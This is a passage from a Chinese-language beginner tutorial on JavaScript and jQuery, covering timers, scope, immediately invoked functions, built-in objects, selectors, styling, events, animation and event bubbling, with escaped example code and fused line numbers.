= function()&#123; iSpeed = -2; &#125; oBtn02.onclick = function()&#123; iSpeed = 2; &#125; // 当鼠标移入的时候 oDiv.onmouseover = function()&#123; iNowspeed = iSpeed; iSpeed = 0; &#125; // 当鼠标移出的时候 oDiv.onmouseout = function()&#123; iSpeed = iNowspeed; &#125; &#125; &lt;/script&gt;&lt;/head&gt;&lt;body&gt; &lt;div class="btns_con"&gt; &lt;div class="left" id="btn01"&gt;&amp;lt;&lt;/div&gt; &lt;div class="right" id="btn02"&gt;&amp;gt;&lt;/div&gt; &lt;/div&gt; &lt;div class="list_con" id="slide"&gt; &lt;ul&gt; &lt;li&gt;&lt;a href=""&gt;&lt;img src="images/goods001.jpg" alt="商品图片"&gt;&lt;/a&gt;&lt;/li&gt; &lt;li&gt;&lt;a href=""&gt;&lt;img src="images/goods002.jpg" alt="商品图片"&gt;&lt;/a&gt;&lt;/li&gt; &lt;li&gt;&lt;a href=""&gt;&lt;img src="images/goods003.jpg" alt="商品图片"&gt;&lt;/a&gt;&lt;/li&gt; &lt;li&gt;&lt;a href=""&gt;&lt;img src="images/goods004.jpg" alt="商品图片"&gt;&lt;/a&gt;&lt;/li&gt; &lt;li&gt;&lt;a href=""&gt;&lt;img src="images/goods005.jpg" alt="商品图片"&gt;&lt;/a&gt;&lt;/li&gt; &lt;/ul&gt; &lt;/div&gt;&lt;/body&gt;&lt;/html&gt;3、定时器制作时钟12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364&lt;script type="text/javascript"&gt; window.onload = function()&#123; var oDiv = document.getElementById('div1'); function timego()&#123; var now = new Date(); var year = now.getFullYear(); var month = now.getMonth()+1; var date = now.getDate(); var week = now.getDay(); var hour = now.getHours(); var minute = now.getMinutes(); var second = now.getSeconds(); var str = '当前时间是：'+ year + '年'+month+'月'+date+'日 '+toweek(week)+' '+todou(hour)+':'+todou(minute)+':'+todou(second); oDiv.innerHTML = str; &#125; timego(); setInterval(timego,1000); &#125; function toweek(n)&#123; if(n==0) &#123; return '星期日'; &#125; else if(n==1) &#123; return '星期一'; &#125; else if(n==2) &#123; return '星期二'; &#125; else if(n==3) &#123; return '星期三'; &#125; else if(n==4) &#123; return '星期四'; &#125; else if(n==5) &#123; return '星期五'; &#125; else &#123; return '星期六'; &#125; &#125; function todou(n)&#123; if(n&lt;10) &#123; return '0'+n; &#125; else &#123; return n; &#125; &#125;&lt;/script&gt;......&lt;div id="div1"&gt;&lt;/div&gt;4、定时器制作倒计时123456789101112131415161718192021&lt;script type="text/javascript"&gt; window.onload = function()&#123; var oDiv = document.getElementById('div1'); function timeleft()&#123; var now = new Date(); var future = new Date(2016,8,12,24,0,0); var lefts = parseInt((future-now)/1000); var day = parseInt(lefts/86400); var hour = parseInt(lefts%86400/3600); var min = parseInt(lefts%86400%3600/60); var sec = lefts%60; str = '距离2016年9月12日晚24点还剩下'+day+'天'+hour+'时'+min+'分'+sec+'秒'; oDiv.innerHTML = str; &#125; timeleft(); setInterval(timeleft,1000); &#125;&lt;/script&gt;......&lt;div id="div1"&gt;&lt;/div&gt;9.16 变量作用域变量作用域指的是变量的作用范围，javascript中的变量分为全局变量和局部变量。1、全局变量：在函数之外定义的变量，为整个页面公用，函数内部外部都可以访问。2、局部变量：在函数内部定义的变量，只能在定义该变量的函数内部访问，外部无法访问。1234567891011121314&lt;script type="text/javascript"&gt; //全局变量 var a = 12; function myalert() &#123; //局部变量 var b = 23; alert(a); alert(b); &#125; myalert(); //弹出12和23 alert(a); //弹出12 alert(b); //出错&lt;/script&gt;9.17 封闭函数封闭函数是javascript中匿名函数的另外一种写法，创建一个一开始就执行而不用命名的函数。一般定义的函数和执行函数：12345function myalert()&#123; alert('hello!');&#125;;myalert();封闭函数：123(function myalert()&#123; alert('hello!');&#125;)();还可以在函数定义前加上“~”和“!”等符号来定义匿名函数123!function myalert()&#123; alert('hello!');&#125;()9.17.1 封闭函数的好处封闭函数可以创造一个独立的空间，在封闭函数内定义的变量和函数不会影响外部同名的函数和变量，可以避免命名冲突，在页面上引入多个js文件时，用这种方式添加js文件比较安全，比如：1234567891011121314var iNum01 = 12;function myalert()&#123; alert('hello!');&#125;(function()&#123; var iNum01 = 24; function myalert()&#123; alert('hello!world'); &#125; alert(iNum01); myalert()&#125;)()alert(iNum01);myalert();9.18 常用内置对象1、document123document.getElementById //通过id获取元素document.getElementsByTagName //通过标签名获取元素document.referrer //获取上一个跳转页面的地址(需要服务器环境)2、location123window.location.href //获取或者重定url地址window.location.search //获取地址参数部分window.location.hash //获取页面锚点或者叫哈希值1234567891011121314&lt;script type="text/javascript"&gt; window.onload = function () &#123; // 存储上一个页面的地址 var sUrl = document.referrer; var oBtn = document.getElementById("btn01"); oBtn.onclick = function () &#123; window.location.href = "http://www.baidu.com"; &#125;; alert(window.location.search); &#125;&lt;/script&gt;&lt;input type="button" id="btn01" value="跳转" name=""&gt;课堂练习通过地址栏的参数改变页面状态，如下的示例是通过地址栏中的参数改变页面背景色1234567891011121314151617181920212223242526&lt;!DOCTYPE html&gt;&lt;html lang="en"&gt;&lt;head&gt; &lt;meta charset="UTF-8"&gt; &lt;title&gt;Test&lt;/title&gt; &lt;script type="text/javascript"&gt; window.onload = function () &#123; var oBody01 = document.getElementById("body01"); var sData = window.location.search; if (sData != '') &#123; var iNum = sData.split("=")[1]; // console.log(iNum); if (iNum == 1) &#123; oBody01.style.backgroundColor = "red"; &#125; else &#123; oBody01.style.backgroundColor = "pink"; &#125;; &#125;; &#125; &lt;/script&gt;&lt;/head&gt;&lt;body id="body01"&gt;&lt;input type="button" id="btn01" value="跳转" name=""&gt;&lt;/body&gt;&lt;/html&gt;3、Math123Math.random 获取0-1的随机数Math.floor 向下取整Math.ceil 向上取整123456789101112131415&lt;script type="text/javascript"&gt; // var iPi = Math.PI; // alert(iPi); var sList = []; for (var i = 0; i &lt; 20; i++) &#123; // Math.random 返回0到1之间的随机数,不包括1 var iNum = Math.random(); sList.push(iNum); &#125; console.log(sList); alert(Math.floor(5.6)); // 向下取整，结果是5 alert(Math.ceil(5.2)); // 向上取整，结果是6&lt;/script&gt;课堂练习制作一定范围内的随机整数12345// 获取10到20之间的随机整数var iN01 = 10;var iN02 = 20;var result = Math.floor((iN02 - iN01+1)*Math.random()) + iN01;alert(result)10.JQuery10.1 jquery介绍jQuery是目前使用最广泛的javascript函数库。据统计，全世界排名前100万的网站，有46%使用jQuery，远远超过其他库。微软公司甚至把jQuery作为他们的官方库。jQuery的版本分为1.x系列和2.x、3.x系列，1.x系列兼容低版本的浏览器，2.x、3.x系列放弃支持低版本浏览器，目前使用最多的是1.x系列的。jquery是一个函数库，一个js文件，页面用script标签引入这个js文件就可以使用。1&lt;script type=&quot;text/javascript&quot; src=&quot;js/jquery-1.12.2.js&quot;&gt;&lt;/script&gt;jquery的口号和愿望 Write Less, Do More（写得少，做得多）1、http://jquery.com/ 官方网站2、https://code.jquery.com/ 版本下载10.2 jquery加载将获取元素的语句写到页面头部，会因为元素还没有加载而出错，jquery提供了ready方法解决这个问题，它的速度比原生的 window.onload 更快。123456789&lt;script type="text/javascript"&gt;$(document).ready(function()&#123; ......&#125;);&lt;/script&gt;可以简写为：123456789&lt;script type="text/javascript"&gt;$(function()&#123; ......&#125;);&lt;/script&gt;1234567891011121314151617181920212223242526272829303132333435&lt;!DOCTYPE html&gt;&lt;html lang="en"&gt;&lt;head&gt; &lt;meta charset="UTF-8"&gt; &lt;title&gt;Title&lt;/title&gt; &lt;!--不能直接在jquery的引入标签里写js代码，需要另写一个script标签，在这个里面那些js代码--&gt; &lt;script type="text/javascript" src="js/jquery-3.4.1.min.js"&gt;&lt;/script&gt; &lt;script type="text/javascript"&gt; // 原生js写法,onload是整个页面加载完后，再渲染完之后才运行 window.onload = function () &#123; var oDiv = document.getElementById("div1"); alert('这是原生js弹出的div' + oDiv); &#125;; // 完整写法，ready是标签加载完就执行，速度比原生js的快 $(document).ready(function () &#123; var $div = $("#div1"); alert('这是jquery弹出的div-1' + $div); &#125;); // 简单写法 $(function () &#123; var $div = $("#div1"); alert('这是jquery弹出的div-2' + $div); &#125;); &lt;/script&gt;&lt;/head&gt;&lt;body&gt;&lt;div id="div1"&gt; 这是一个div元素&lt;/div&gt;&lt;/body&gt;&lt;/html&gt;10.3 jquery选择器10.3.1 jquery用法思想一选择某个网页元素，然后对它进行某种操作10.3.2 jquery选择器jquery选择器可以快速地选择元素，选择规则和css样式相同，使用length属性判断是否选择成功。12345$('#myId') //选择id为myId的网页元素$('.myClass') // 选择class为myClass的元素$('li') //选择所有的li元素$('#ul1 li span') //选择id为ul1元素下的所有li下的span元素$('input[name=first]') // 选择name属性等于first的input元素12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758&lt;!DOCTYPE html&gt;&lt;html lang="en"&gt;&lt;head&gt; &lt;meta charset="UTF-8"&gt; &lt;title&gt;Title&lt;/title&gt; &lt;!--不能直接在jquery的引入标签里写js代码，需要另写一个script标签，在这个里面那些js代码--&gt; &lt;script type="text/javascript" src="js/jquery-3.4.1.min.js"&gt;&lt;/script&gt; &lt;script type="text/javascript"&gt; $(function () &#123; var $div = $("#div1"); $div.css(&#123;"color":"red"&#125;); var $div2 = $(".box"); $div2.css(&#123;"color":"green"&#125;); var $li = $(".list li"); // 带'-'的样式属性可以写成驼峰式，也可以写成原始的，容错 // $li.css(&#123;"backgroundColor":"pink"&#125;); $li.css(&#123;"background-color":"pink"&#125;); &#125;); &lt;/script&gt; &lt;!--&lt;style type="text/css"&gt;--&gt; &lt;!--#div1&#123;--&gt; &lt;!--color: gold;--&gt; &lt;!--&#125;--&gt; &lt;!--.box&#123;--&gt; &lt;!--color: green;--&gt; &lt;!--&#125;--&gt; &lt;!--.list li&#123;--&gt; &lt;!--background-color: pink;--&gt; &lt;!--&#125;--&gt; &lt;!--&lt;/style&gt;--&gt;&lt;/head&gt;&lt;body&gt;&lt;div id="div1"&gt;这是一个div元素&lt;/div&gt;&lt;div class="box"&gt;这是第二个div元素&lt;/div&gt;&lt;div class="box"&gt;这是第三个div元素&lt;/div&gt;&lt;!--ul.list&gt;li&#123;$&#125;*8--&gt;&lt;ul class="list"&gt; &lt;li&gt;1&lt;/li&gt; &lt;li&gt;2&lt;/li&gt; &lt;li&gt;3&lt;/li&gt; &lt;li&gt;4&lt;/li&gt; &lt;li&gt;5&lt;/li&gt; &lt;li&gt;6&lt;/li&gt; &lt;li&gt;7&lt;/li&gt; &lt;li&gt;8&lt;/li&gt;&lt;/ul&gt;&lt;/body&gt;&lt;/html&gt;10.3.3对选择集进行过滤1234$('div').has('p'); // 选择包含p元素的div元素$('div').not('.myClass'); //选择class不等于myClass的div元素$('div').filter('.myClass'); //选择class等于myClass的div元素$('div').eq(5); //选择第6个div元素12345678910111213141516171819202122232425262728293031&lt;!DOCTYPE html&gt;&lt;html lang="en"&gt;&lt;head&gt; &lt;meta charset="UTF-8"&gt; &lt;title&gt;Title&lt;/title&gt; &lt;!--不能直接在jquery的引入标签里写js代码，需要另写一个script标签，在这个里面那些js代码--&gt; &lt;script type="text/javascript" src="js/jquery-3.4.1.min.js"&gt;&lt;/script&gt; &lt;script type="text/javascript"&gt; $(function () &#123; // var $div = $("div"); // $div.css(&#123;"background-color":"red"&#125;); $("div").css(&#123;"background-color":"gold"&#125;); $("div").has('p').css(&#123;"background-color":"red"&#125;); $("div").eq(4).css(&#123;"text-indent":"30px"&#125;); &#125;); &lt;/script&gt;&lt;/head&gt;&lt;body&gt;&lt;div&gt;1&lt;/div&gt;&lt;div&gt;&lt;p&gt;2&lt;/p&gt;&lt;/div&gt;&lt;div&gt;3&lt;/div&gt;&lt;div&gt;4&lt;/div&gt;&lt;div&gt;5&lt;/div&gt;&lt;div&gt;6&lt;/div&gt;&lt;div&gt;7&lt;/div&gt;&lt;div&gt;8&lt;/div&gt;&lt;/body&gt;&lt;/html&gt;10.3.4 选择集转移12345678$('div').prev(); //选择div元素前面紧挨的同辈元素$('div').prevAll(); //选择div元素之前所有的同辈元素$('div').next(); //选择div元素后面紧挨的同辈元素$('div').nextAll(); //选择div元素后面所有的同辈元素$('div').parent(); //选择div的父元素$('div').children(); //选择div的所有子元素$('div').siblings(); //选择div的同级元素$('div').find('.myClass'); //选择div内的class等于myClass的元素12345678910111213141516171819202122232425262728&lt;!DOCTYPE html&gt;&lt;html lang="en"&gt;&lt;head&gt; &lt;meta charset="UTF-8"&gt; &lt;title&gt;Title&lt;/title&gt; &lt;!--不能直接在jquery的引入标签里写js代码，需要另写一个script标签，在这个里面那些js代码--&gt; &lt;script type="text/javascript" src="js/jquery-3.4.1.min.js"&gt;&lt;/script&gt; &lt;script type="text/javascript"&gt; $(function () &#123; $("div").eq(4).prev().css(&#123;"color":"green"&#125;); $("div").find(".tip").css(&#123;"color":"red"&#125;); &#125;); &lt;/script&gt;&lt;/head&gt;&lt;body&gt;&lt;div&gt;1&lt;/div&gt;&lt;div&gt;&lt;p&gt;2&lt;/p&gt;&lt;/div&gt;&lt;div&gt;7&lt;/div&gt;&lt;div&gt; &lt;span&gt;8&lt;/span&gt; &lt;span class="tip"&gt;9&lt;/span&gt;&lt;/div&gt;&lt;/body&gt;&lt;/html&gt;10.3.5 判断是否选择到了元素jquery有容错机制，即使没有找到元素，也不会出错，可以用length属性来判断是否找到了元素,length等于0，就是没选择到元素，length大于0，就是选择到了元素。123456789101112131415161718192021222324&lt;!DOCTYPE html&gt;&lt;html lang="en"&gt;&lt;head&gt; &lt;meta charset="UTF-8"&gt; &lt;title&gt;Title&lt;/title&gt; &lt;!--不能直接在jquery的引入标签里写js代码，需要另写一个script标签，在这个里面那些js代码--&gt; &lt;script type="text/javascript" src="js/jquery-3.4.1.min.js"&gt;&lt;/script&gt; &lt;script type="text/javascript"&gt; $(function () &#123; var $div1 = $('#div1'); // 没有选中元素，也不会报错，程序正常运行 var $div2 = $('#div2'); alert($div1.length); // 弹出1 alert($div2.length); // 弹出0 &#125;); &lt;/script&gt;&lt;/head&gt;&lt;body&gt;&lt;div id="div1"&gt;div元素&lt;/div&gt;&lt;/body&gt;&lt;/html&gt;10.4 jquery样式操作10.4.1 jquery用法思想二同一个函数完成取值和赋值10.4.2 操作行间样式12345678// 获取div的样式$("div").css("width");$("div").css("color");//设置div的样式$("div").css("width","30px");$("div").css("height","30px");$("div").css(&#123;fontSize:"30px",color:"red"&#125;);12345678910111213141516171819202122232425262728293031323334&lt;!DOCTYPE html&gt;&lt;html lang="en"&gt;&lt;head&gt; &lt;meta charset="UTF-8"&gt; &lt;title&gt;Title&lt;/title&gt; &lt;!--不能直接在jquery的引入标签里写js代码，需要另写一个script标签，在这个里面那些js代码--&gt; &lt;script type="text/javascript" src="js/jquery-3.4.1.min.js"&gt;&lt;/script&gt; &lt;script type="text/javascript"&gt; $(function () &#123; var $div1 = $('#div1'); $div1.css("width", "30px"); $div1.css("height", "30px"); $div1.css(&#123;fontSize: "30px", color: "red"&#125;); alert($div1.css('width')); alert($div1.css('color')); // 原生js无法读取行间没有定义的css属性值,但是可以读取行间已定义的css属性值 var oDiv = document.getElementById("box"); alert(oDiv.style.height); // 空 alert(oDiv.style.fontSize); // 20px &#125;); &lt;/script&gt;&lt;/head&gt;&lt;body&gt;&lt;div id="div1"&gt;div元素&lt;/div&gt;&lt;div id="box" style="font-size: 20px;"&gt;div元素&lt;/div&gt;&lt;/body&gt;&lt;/html&gt;特别注意选择器获取的多个元素，获取信息获取的是第一个，比如：$(“div”).css(“width”)，获取的是第一个div的width。123456789101112131415161718192021222324&lt;!DOCTYPE html&gt;&lt;html lang="en"&gt;&lt;head&gt; &lt;meta charset="UTF-8"&gt; &lt;title&gt;Title&lt;/title&gt; &lt;!--不能直接在jquery的引入标签里写js代码，需要另写一个script标签，在这个里面那些js代码--&gt; &lt;script type="text/javascript" src="js/jquery-3.4.1.min.js"&gt;&lt;/script&gt; &lt;script type="text/javascript"&gt; $(function () &#123; var $div = $('div'); alert($div.css("color")); // rgb(0,128,0) =&gt; green &#125;); &lt;/script&gt;&lt;/head&gt;&lt;body&gt;&lt;div style="color: green"&gt;1.div元素&lt;/div&gt;&lt;div style="color: red"&gt;2.div元素&lt;/div&gt;&lt;/body&gt;&lt;/html&gt;10.4.3 操作样式类名1234$("#div1").addClass("divClass2") //为id为div1的对象追加样式divClass2,不是替换成divClass2$("#div1").removeClass("divClass") //移除id为div1的对象的class名为divClass的样式$("#div1").removeClass("divClass divClass2") //移除多个样式$("#div1").toggleClass("anotherClass") //重复切换anotherClass样式，比如点击增加，再点击移除等操作12345678910111213141516171819202122232425262728293031323334353637&lt;!DOCTYPE html&gt;&lt;html lang="en"&gt;&lt;head&gt; &lt;meta charset="UTF-8"&gt; &lt;title&gt;Title&lt;/title&gt; &lt;!--不能直接在jquery的引入标签里写js代码，需要另写一个script标签，在这个里面那些js代码--&gt; &lt;script type="text/javascript" src="js/jquery-3.4.1.min.js"&gt;&lt;/script&gt; &lt;script type="text/javascript"&gt; $(function () &#123; var $div = $('.box'); $div.addClass("big"); $div.removeClass("box"); $div.toggleClass("box"); &#125;); &lt;/script&gt; &lt;style type="text/css"&gt; .box&#123; width: 100px; height: 100px; background-color: gold; &#125; .big&#123; font-size: 30px; &#125; &lt;/style&gt;&lt;/head&gt;&lt;body&gt;&lt;div class="box"&gt;div元素&lt;/div&gt;&lt;/body&gt;&lt;/html&gt;10.5 绑定click事件给元素绑定click事件，可以用如下方法：123456$('#btn1').click(function()&#123; // 内部的this指的是原生对象 // 使用jquery对象用 $(this)&#125;)1234567891011121314151617181920212223242526272829303132333435363738394041424344&lt;!DOCTYPE html&gt;&lt;html lang="en"&gt;&lt;head&gt; &lt;meta charset="UTF-8"&gt; &lt;title&gt;Title&lt;/title&gt; &lt;!--不能直接在jquery的引入标签里写js代码，需要另写一个script标签，在这个里面那些js代码--&gt; &lt;script type="text/javascript" src="js/jquery-3.4.1.min.js"&gt;&lt;/script&gt; &lt;script type="text/javascript"&gt; $(function () &#123; // 绑定click事件 $("#btn").click(function () &#123; // if ($(".box").hasClass("col01")) &#123; // $(".box").removeClass("col01"); // &#125; else &#123; // $(".box").addClass("col01"); // &#125; // 简化写法 $(".box").toggleClass("col01"); &#125;); &#125;); &lt;/script&gt; &lt;style type="text/css"&gt; .box &#123; width: 100px; height: 100px; background-color: gold; &#125; .col01 &#123; background-color: green; &#125; &lt;/style&gt;&lt;/head&gt;&lt;body&gt;&lt;input type="button" name="" value="切换样式" id="btn"&gt;&lt;div class="box"&gt;div元素&lt;/div&gt;&lt;/body&gt;&lt;/html&gt;10.5.1 获取元素的索引值有时候需要获得匹配元素相对于其同胞元素的索引位置，此时可以用index()方法获取12345678910var $li = $('.list li').eq(1);alert($li.index()); // 弹出1......&lt;ul class="list"&gt; &lt;li&gt;1&lt;/li&gt; &lt;li&gt;2&lt;/li&gt; &lt;li&gt;4&lt;/li&gt; &lt;li&gt;5&lt;/li&gt; &lt;li&gt;6&lt;/li&gt;&lt;/ul&gt;课堂练习选项卡1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374&lt;!DOCTYPE html&gt;&lt;html lang="en"&gt;&lt;head&gt; &lt;meta charset="UTF-8"&gt; &lt;title&gt;Title&lt;/title&gt; &lt;!--不能直接在jquery的引入标签里写js代码，需要另写一个script标签，在这个里面那些js代码--&gt; &lt;script type="text/javascript" src="js/jquery-3.4.1.min.js"&gt;&lt;/script&gt; &lt;script type="text/javascript"&gt; $(function () &#123; var $btn = $(".btns input"); var $div = $(".cons div"); $btn.click(function () &#123; // this指的是原生this,它表示当前点击的对象 // 当前点击的按钮加上current样式后，除了当前，其他的按钮去掉current样式 $(this).addClass("current").siblings().removeClass("current"); // alert($(this).index()); // 查看当前点击对象的索引值 // 当前点击的按钮对应索引值的div加上active样式，其他的去掉active样式 $div.eq($(this).index()).addClass("active").siblings().removeClass("active"); &#125;) &#125;); &lt;/script&gt; &lt;style type="text/css"&gt; .btns input &#123; width: 100px; height: 40px; background-color: #dddddd; &#125; .btns .current &#123; background-color: gold; &#125; .cons div &#123; width: 500px; height: 300px; background-color: gold; display: none; text-align: center; line-height: 300px; font-size: 30px; &#125; .cons .active &#123; display: block; &#125; &lt;/style&gt;&lt;/head&gt;&lt;body&gt;&lt;div class="btns"&gt; &lt;input type="button" name="" value="01" class="current"&gt; &lt;input type="button" name="" value="02"&gt; &lt;input type="button" name="" value="03"&gt;&lt;/div&gt;&lt;div class="cons"&gt; &lt;div class="active"&gt;选项卡一的内容&lt;/div&gt; &lt;div&gt;选项卡二的内容&lt;/div&gt; &lt;div&gt;选项卡三的内容&lt;/div&gt;&lt;/div&gt;&lt;/body&gt;&lt;/html&gt;10.6 jquery特殊效果123456789101112131415161718fadeIn() 淡入 $btn.click(function()&#123; $('#div1').fadeIn(1000,'swing',function()&#123; alert('done!'); &#125;); &#125;);fadeOut() 淡出fadeToggle() 切换淡入淡出hide() 隐藏元素show() 显示元素toggle() 切换元素的可见状态slideDown() 向下展开slideUp() 向上卷起slideToggle() 依次展开或卷起某个元素10.7 jquery链式调用jquery对象的方法会在执行完后返回这个jquery对象，所有jquery对象的方法可以连起来写：1234567$('#div1') // id为div1的元素.children('ul') //该元素下面的ul子元素.slideDown('fast') //高度从零变到实际高度来显示ul元素.parent() //跳到ul的父元素，也就是id为div1的元素.siblings() //跳到div1元素平级的所有兄弟元素.children('ul') //这些兄弟元素中的ul子元素.slideUp('fast'); //高度实际高度变换到零来隐藏ul元素课堂练习 - 层级菜单123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139&lt;!DOCTYPE html&gt;&lt;html lang="en"&gt;&lt;head&gt; &lt;meta charset="UTF-8"&gt; &lt;title&gt;Title&lt;/title&gt; &lt;!--不能直接在jquery的引入标签里写js代码，需要另写一个script标签，在这个里面那些js代码--&gt; &lt;script type="text/javascript" src="js/jquery-3.4.1.min.js"&gt;&lt;/script&gt; &lt;script type="text/javascript"&gt; $(function () &#123; $('.level1').click(function () &#123; //当前点击的元素紧挨的同辈元素向下展开，再跳到此元素的父级(li),再跳到此父级的其他的同辈元素(li),选择其他同辈元素(li)的子元素ul，然后将它向上收起。 // 通过stop() 可以修正反复点击导致的持续动画的问题 $(this).next().stop().slideToggle().parent().siblings().children('ul').slideUp(); &#125;) &#125;) &lt;/script&gt; &lt;style type="text/css"&gt; body &#123; font-family: 'Microsoft Yahei'; &#125; body, ul &#123; margin: 0px; padding: 0px; &#125; ul &#123; list-style: none; &#125; .menu &#123; width: 200px; margin: 20px auto 0; &#125; .menu .level1, .menu li ul a &#123; display: block; width: 200px; height: 30px; line-height: 30px; text-decoration: none; background-color: #3366cc; color: #fff; font-size: 16px; text-indent: 10px; &#125; .menu .level1 &#123; border-bottom: 1px solid #afc6f6; &#125; .menu li ul a &#123; font-size: 14px; text-indent: 20px; background-color: #7aa1ef; &#125; .menu li ul li &#123; border-bottom: 1px solid #afc6f6; &#125; .menu li ul &#123; display: none; &#125; .menu li ul.current &#123; display: block; &#125; .menu li ul li a:hover &#123; background-color: #f6b544; &#125; &lt;/style&gt;&lt;/head&gt;&lt;body&gt;&lt;ul class="menu"&gt; &lt;li&gt; &lt;a href="#" class="level1"&gt;水果&lt;/a&gt; &lt;ul class="current"&gt; &lt;li&gt;&lt;a href="#"&gt;苹果&lt;/a&gt;&lt;/li&gt; &lt;li&gt;&lt;a href="#"&gt;梨子&lt;/a&gt;&lt;/li&gt; &lt;li&gt;&lt;a href="#"&gt;葡萄&lt;/a&gt;&lt;/li&gt; &lt;li&gt;&lt;a href="#"&gt;火龙果&lt;/a&gt;&lt;/li&gt; &lt;/ul&gt; &lt;/li&gt; &lt;li&gt; &lt;a href="#" class="level1"&gt;海鲜&lt;/a&gt; &lt;ul&gt; &lt;li&gt;&lt;a href="#"&gt;蛏子&lt;/a&gt;&lt;/li&gt; &lt;li&gt;&lt;a href="#"&gt;扇贝&lt;/a&gt;&lt;/li&gt; &lt;li&gt;&lt;a href="#"&gt;龙虾&lt;/a&gt;&lt;/li&gt; &lt;li&gt;&lt;a href="#"&gt;象拔蚌&lt;/a&gt;&lt;/li&gt; &lt;/ul&gt; &lt;/li&gt; &lt;li&gt; &lt;a href="#" class="level1"&gt;肉类&lt;/a&gt; &lt;ul&gt; &lt;li&gt;&lt;a href="#"&gt;内蒙古羊肉&lt;/a&gt;&lt;/li&gt; &lt;li&gt;&lt;a href="#"&gt;进口牛肉&lt;/a&gt;&lt;/li&gt; &lt;li&gt;&lt;a href="#"&gt;野猪肉&lt;/a&gt;&lt;/li&gt; &lt;/ul&gt; &lt;/li&gt; &lt;li&gt; &lt;a href="#" class="level1"&gt;蔬菜&lt;/a&gt; &lt;ul&gt; &lt;li&gt;&lt;a href="#"&gt;娃娃菜&lt;/a&gt;&lt;/li&gt; &lt;li&gt;&lt;a href="#"&gt;西红柿&lt;/a&gt;&lt;/li&gt; &lt;li&gt;&lt;a href="#"&gt;西芹&lt;/a&gt;&lt;/li&gt; &lt;li&gt;&lt;a href="#"&gt;胡萝卜&lt;/a&gt;&lt;/li&gt; &lt;/ul&gt; &lt;/li&gt; &lt;li&gt; &lt;a href="#" class="level1"&gt;速冻&lt;/a&gt; &lt;ul&gt; &lt;li&gt;&lt;a href="#"&gt;冰淇淋&lt;/a&gt;&lt;/li&gt; &lt;li&gt;&lt;a href="#"&gt;湾仔码头&lt;/a&gt;&lt;/li&gt; &lt;li&gt;&lt;a href="#"&gt;海参&lt;/a&gt;&lt;/li&gt; &lt;li&gt;&lt;a href="#"&gt;牛肉丸&lt;/a&gt;&lt;/li&gt; &lt;/ul&gt; &lt;/li&gt;&lt;/ul&gt;&lt;/body&gt;&lt;/html&gt;10.8 jquery动画通过animate方法可以设置元素某属性值上的动画，可以设置一个或多个属性值，动画执行完成后会执行一个函数。123456$('#div1').animate(&#123; width:300, height:300&#125;,1000,'swing',function()&#123; alert('done!');&#125;);参数可以写成数字表达式：123456$('#div1').animate(&#123; width:'+=100', height:300&#125;,1000,'swing',function()&#123; alert('done!');&#125;);10.9 尺寸相关、滚动事件1、获取和设置元素的尺寸1234width()、height() 获取元素width和height innerWidth()、innerHeight() 包括padding的width和height outerWidth()、outerHeight() 包括padding和border的width和height outerWidth(true)、outerHeight(true) 包括padding和border以及margin的width和height2、获取元素相对页面的绝对位置1offset()3、获取浏览器可视区宽度高度12$(window).width();$(window).height();4、获取页面文档的宽度高度12$(document).width();$(document).height();5、获取页面滚动距离12$(document).scrollTop(); $(document).scrollLeft();6、页面滚动事件123$(window).scroll(function()&#123; ...... &#125;)10.10 jquery属性操作1、html() 取出或设置html内容1234567// 取出html内容var $htm = $('#div1').html();// 设置html内容$('#div1').html('&lt;span&gt;添加文字&lt;/span&gt;');2、prop() 取出或设置某个属性的值1234567// 取出图片的地址var $src = $('#img1').prop('src');// 设置图片的地址和alt属性$('#img1').prop(&#123;src: "test.jpg", alt: "Test Image" &#125;);10.11 jquery循环对jquery选择的对象集合分别进行操作，需要用到jquery循环操作，此时可以用对象上的each方法：1234567891011121314$(function()&#123; $('.list li').each(function(i)&#123; $(this).html(i); &#125;)&#125;)......&lt;ul class="list"&gt; &lt;li&gt;&lt;/li&gt; &lt;li&gt;&lt;/li&gt; &lt;li&gt;&lt;/li&gt; &lt;li&gt;&lt;/li&gt; &lt;li&gt;&lt;/li&gt; &lt;li&gt;&lt;/li&gt;&lt;/ul&gt;10.12 jquery事件10.12.1 事件函数列表：123456789101112blur() 元素失去焦点focus() 元素获得焦点click() 鼠标单击mouseover() 鼠标进入（进入子元素也触发）mouseout() 鼠标离开（离开子元素也触发）mouseenter() 鼠标进入（进入子元素不触发）mouseleave() 鼠标离开（离开子元素不触发）hover() 同时为mouseenter和mouseleave事件指定处理函数ready() DOM加载完成resize() 浏览器窗口的大小发生改变scroll() 滚动条的位置发生变化submit() 用户递交表单10.12.2 绑定事件的其他方式12345$(function()&#123; $('#div1').bind('mouseover click', function(event) &#123; alert($(this).html()); &#125;);&#125;);10.12.3 取消绑定事件123456789$(function()&#123; $('#div1').bind('mouseover click', function(event) &#123; alert($(this).html()); // $(this).unbind(); $(this).unbind('mouseover'); &#125;);&#125;);10.13 事件冒泡10.13.1 什么是事件冒泡在一个对象上触发某类事件（比如单击onclick事件），如果此对象定义了此事件的处理程序，那么此事件就会调用这个处理程序，如果没有定义此事件处理程序或者事件返回true，那么这个事件会向这个对象的父级对象传播，从里到外，直至它被处理（父级对象所有同类事件都将被激活），或者它到达了对象层次的最顶层，即document对象（有些浏览器是window）。10.13.2 事件冒泡的作用事件冒泡允许多个操作被集中处理（把事件处理器添加到一个父级元素上，避免把事件处理器添加到多个子级元素上），它还可以让你在对象层的不同级别捕获事件。10.13.3 阻止事件冒泡事件冒泡机制有时候是不需要的，需要阻止掉，通过 event.stopPropagation() 来阻止123456789101112131415161718192021222324252627$(function()&#123; var $box1 = $('.father'); var $box2 = $('.son'); var $box3 = $('.grandson'); $box1.click(function() &#123; alert('father'); &#125;); $box2.click(function() &#123; alert('son'); &#125;); $box3.click(function(event) &#123; alert('grandson'); event.stopPropagation(); &#125;); $(document).click(function(event) &#123; alert('grandfather'); &#125;);&#125;)......&lt;div class="father"&gt; &lt;div class="son"&gt; &lt;div class="grandson"&gt;&lt;/div&gt; &lt;/div&gt;&lt;/div&gt;10.13.4 阻止默认行为阻止表单提交123$('#form1').submit(function(event)&#123; event.preventDefault();&#125;)10.14.5 合并阻止操作实际开发中，一般把阻止冒泡和阻止默认行为合并起来写，合并写法可以用12345// event.stopPropagation();// event.preventDefault();// 